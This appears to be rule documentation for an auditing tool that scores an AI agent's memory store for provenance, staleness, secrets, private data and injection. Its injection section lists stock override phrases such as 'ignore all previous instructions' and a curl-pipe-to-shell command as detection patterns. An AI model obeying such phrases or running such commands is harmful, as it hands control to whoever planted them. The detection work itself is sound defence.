# Trust rules

Every rule has an id, a category, a severity, a description, a remediation and a test.
`context` passed to a test is `{ record, records, now, maxAgeDays }`.

Severities: `critical`, `high`, `medium`, `low`, `info`.
Categories: `provenance`, `freshness`, `conflict`, `sensitivity`, `privacy`, `structure`,
`injection`.

## Provenance

### MT-PROV-001 — high — record has no source

Fires when `source` is missing or empty. A claim nobody can trace back to an origin cannot
be reviewed.

**Remediation:** record where the memory came from (conversation id, file path, ticket) in
the `source` field.

### MT-PROV-002 — medium — source is a bare URL

Fires when `source` is an `http(s)` URL that is neither archived (web.archive.org and
similar) nor pinned to an immutable revision (commit, tag, blob path, hash or version).

**Remediation:** point the source at an archived copy or a pinned commit, tag or content
hash.

### MT-PROV-003 — medium — low confidence

Fires when `confidence` is below `0.5`: the store itself doubts the claim.

**Remediation:** raise confidence only after verification; otherwise delete the claim or
mark it as a hypothesis.

## Freshness

### MT-FRESH-001 — medium — older than the freshness window

Fires when `createdAt` is older than `maxAgeDays` (default 180 days) relative to `now`.

**Remediation:** re-verify the claim and refresh `createdAt`, or remove it if it no longer
holds.

### MT-FRESH-002 — high — expired

Fires when `expiresAt` is in the past relative to `now`.

**Remediation:** delete the expired memory or extend `expiresAt` once the claim has been
re-confirmed.

## Conflict

Both conflict rules compare the whole record set, so they run once per audit rather than
per record.

### MT-CONF-001 — high — contradicting records

Fires when another record has the same `id` but different `content`.

**Remediation:** merge the conflicting claims into one record, or give the losing claim a
distinct id.

### MT-CONF-002 — medium — duplicate records

Fires when another record has the same `id` and the same `content`.

**Remediation:** delete the duplicate record so the memory is stored once.

## Sensitivity

### MT-SENS-001 — critical — secret material

Fires on a private key block, an AWS access key id (`AKIA…`), a GitHub token
(`ghp_…`, `github_pat_…`), a Slack token (`xox…`) or an `sk-` API key.

**Remediation:** remove the secret from the memory store, rotate the credential, and store
only a reference to the secret manager.

### MT-SENS-002 — high — literal credential assignment

Fires on an assignment such as `password = "..."`, `api_key: ...` or `token: ...` whose
value is not a placeholder. Placeholders (`your_api_key_here`, `xxx`, `<your-token>`,
`changeme`, `example.com`, `REPLACE_ME`) never fire this rule.

**Remediation:** replace the literal credential with a secret-manager reference such as
`env://SERVICE_TOKEN`.

## Privacy

### MT-PRIV-001 — high — email address

Fires on any email address, including `user@example.com`.

**Remediation:** remove the email address and keep a non-identifying reference instead.

### MT-PRIV-002 — medium — phone or card number

Fires on a phone number or a credit-card-like number (13–19 digits that pass the Luhn
check).

**Remediation:** remove the number from the memory store and keep a masked or hashed
reference instead.

### MT-PRIV-003 — medium — third-party data without consent

Fires when the content mentions a third party (spouse, colleague, landlord, doctor and
similar) and `consent` is not `true`.

**Remediation:** remove the third-party detail, or record explicit consent for that person
before storing it.

## Structure

### MT-STRUCT-001 — medium — missing id

Fires when the required field `id` is missing or empty.

**Remediation:** give every record a stable, unique id so it can be updated and
de-duplicated.

### MT-STRUCT-002 — medium — missing content

Fires when the required field `content` is missing or empty.

**Remediation:** store the remembered content, or delete the empty record.

## Injection

### MT-INJ-001 — critical — instruction-shaped text

Fires on text aimed at an agent, such as "ignore all previous instructions", "you are now
in developer mode" or "do not tell the user".

**Remediation:** delete the instruction-shaped content; treat stored memories as data,
never as instructions.

### MT-INJ-002 — high — pipe-to-shell command

Fires on a command that pipes a download into a shell or interpreter, such as
`curl https://example.com/install.sh | sh`.

**Remediation:** remove the command from the memory store and treat the record as
compromised.

## Scoring

| Severity | Weight |
| --- | --- |
| critical | 20 |
| high | 10 |
| medium | 4 |
| low | 2 |
| info | 0 |

The score is the sum of the weights, capped at 100. Bands: A+ (0–9), A (10–19),
B (20–34), C (35–49), D (50–69), F (70–100).
